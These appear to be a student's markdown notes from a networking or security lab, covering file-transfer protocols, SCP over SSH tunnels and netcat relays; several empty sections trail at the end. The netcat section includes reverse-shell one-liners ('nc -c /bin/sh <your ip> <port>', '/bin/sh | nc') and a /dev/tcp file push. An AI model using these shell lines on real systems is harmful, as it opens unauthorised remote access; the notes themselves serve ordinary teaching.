## Data Transfer
```

TFTP -- not secure at all
FTP -- requires a logon(unencrypted)
SFTP -- putting FTP into ssh
SCP -- :)

```

## TFTP
```

UDP 
Small and simple communication
No termainal communication(can't ls or anything)
Used for BOOTP and PXE
No directories

```

## FTP
```

TCP
Port 21 (Control)/ Port 20 (Data)
Has Directories
Also supports anonymous logon

passive
get <file>

```

## SFTP
```

TCP Port 22
Adds SSH to FTP

```

## FTPS
```

TCP Port 443
Adds another kind of encryption
Username/Password

```

## WGET
```

wget -r ftp://10.0.0.104 (gets everything from that location and puts it in a directory)

```

## SCP
```

TCP Port 22
Non interactive

scp -3 (access one computer and send it to another computer)
scp -P 1111 (specifies port 1111)
ssh user@ip -p 1111 (specifies port 1111)

SCP tunnel:
ssh student@172.16.82.106 -L 1111:localhost:22 -NT
scp -P 1111 student@localhost:secretstuff.txt /home/student

```

## NetCat
```

used for troubleshooting
can send and recieve data (not secure)
port scanning (similar to nmap -sT)

client (sends)-- nc 10.2.0.2 9002 < file.txt
listener (recieve)-- nc -l -p 9001 > newfile.txt
(Can be reversed)

RELAY:
mknod mypipe p
nc 10.1.0.2 9002 0< mypipe | nc 10.2.0.2 9001 1> mypipe

/dev/tcp
nc -l -p 1111 > file.txt
cat file.txt > /dev/tcp/10.2.0.2/1111

nc -c /bin/sh <your ip> <any unfiltered port>
/bin/sh | nc 
pull files to internethost and open pictures with eom/eog

NETCAT RELAY DEMO:
on middleman:
**create named pipe**
mknod MYPIPE p || mkfifo MYPIPE
nc -lp 1111 > MYPIPE | nc -lp 2222 < MYPIPE

other device(send):
nc 10.0.0.102 1111 < flag.png

third device(recieve):
nc 10.0.0.102 2222 > flag -- (wait a minute and close)

```

## 
```



```

## 
```



```

## 
```



```

## 
```



```

## 
```



```

## 
```



```

## 
```



```

## 
```



```

